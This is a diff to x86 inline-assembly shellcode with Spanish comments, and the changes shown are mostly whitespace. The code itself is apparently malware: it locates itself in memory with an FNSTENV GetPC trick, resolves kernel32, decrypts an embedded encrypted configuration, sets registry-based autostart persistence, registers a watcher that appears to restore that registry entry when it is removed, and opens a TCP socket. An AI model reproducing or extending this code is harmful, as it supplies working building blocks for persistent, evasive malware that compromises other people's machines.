@@ -84,9 +84,9 @@ find_delta:
         D9EC           FLDL2T       MM7-> D49A 784B CD1B 8AFE
         D9ED           FLDPI        MM7-> C90F DAA2 2168 C235
         */
-		fldln2 //60 DB 14 24 D9 34 24 9C 61 81 EB 
+        fldln2 //60 DB 14 24 D9 34 24 9C 61 81 EB 
 #ifdef SC_DELTA
-        _EMIT_ARRAY([0xD9, 0x74, 0x24, 0xF4])				//PERDIDA DE STACK (REVISAR)
+        _EMIT_ARRAY([0xD9, 0x74, 0x24, 0xF4])           //TODO(Posible pérdida de stack)
         pop  edi
         #ifdef SC_NULL
         add  edi, K
@@ -261,7 +261,7 @@ DoNotSkip:
 #ifdef AUTOSTART
         RegWatch: //VOID CALLBACK WaitOrTimerCallback(_In_  PVOID lpParameter, _In_  BOOLEAN TimerOrWaitFired);
         pushad
-		mov  ebp, [esp+0x20+4]			//Obtenemos el puntero a nuestro stack
+        mov  ebp, [esp+0x20+4]          //Obtenemos el puntero a nuestro stack
         cdq
         push ebp                        //v
         add  DWORD PTR[esp], _RegKey    //v
@@ -280,13 +280,13 @@ repeat_count:
         jne repeat_count
 
         shl  edx, 1
-		push edx
-		push [ebp+_CommandLine]
-		push REG_SZ
-		push [ebp+_pMUTEX]
+        push edx
+        push [ebp+_CommandLine]
+        push REG_SZ
+        push [ebp+_pMUTEX]
         cdq
         push edx
-		push [ebp+_RegKey]
+        push [ebp+_RegKey]
         call [ebp+_RegSetKeyValueW]     //> RegSetKeyValueW(RegKey, NULL, " ", REG_SZ, &MyPath, NULL(ignored));
 
         cdq                             //EDX = 0
@@ -447,9 +447,9 @@ find_kernel32_finished:
         //Creamos un buffer para almacenar la configuración cifrada y luego descifrarla.
         movr(esi, config_start)         //Cargamos la posición del inicio de la config
 
-		pushc(RegWatch)
-		add  [esp], edi
-		pop  dword ptr[ebp+_RegWatcher]
+        pushc(RegWatch)
+        add  [esp], edi
+        pop  dword ptr[ebp+_RegWatcher]
 
         /*###############################################################################
         **        TRAS ESTE PUNTO YA NO NECESITAMOS ALMACENAR EL DELTA (EDI)
@@ -655,13 +655,13 @@ found:
         mov[ebp + _RegEvent], eax       //> RegEvent = CreateEventExW(NULL, NULL, CREATE_EVENT_MANUAL_RESET, EVENT_ALL_ACCESS);
 
         push WT_EXECUTEINWAITTHREAD
-		push INFINITE
-		push ebp
-		push [ebp+_RegWatcher]
-		push [ebp+_RegEvent]
-		push ebp
-		add [esp], _RegCB
-		call [ebp+_RegisterWaitForSingleObject]
+        push INFINITE
+        push ebp
+        push [ebp+_RegWatcher]
+        push [ebp+_RegEvent]
+        push ebp
+        add [esp], _RegCB
+        call [ebp+_RegisterWaitForSingleObject]
         //> RegisterWaitForSingeObject(&RegEvent, RegEvent, &RegWatch, EBP(stack propio), INFINITE, WT_EXECUTEINWAITTHREAD);
         cdq                             //EDX = 0
         push edx                        //
@@ -721,7 +721,7 @@ newSocket:
         push edx                        //v
         inc  edx                        //v EDX = 2 (AF_INET)
         push edx                        //v
-        call [ebp+_socket]				//>socket(AF_INET, SOCK_STREAM, 0);
+        call [ebp+_socket]              //>socket(AF_INET, SOCK_STREAM, 0);
         mov  [ebp+_hSocket], eax        //hSocket = EAX
 
         DEBUG_MSG("sNEWSOCKT", ["eax"])
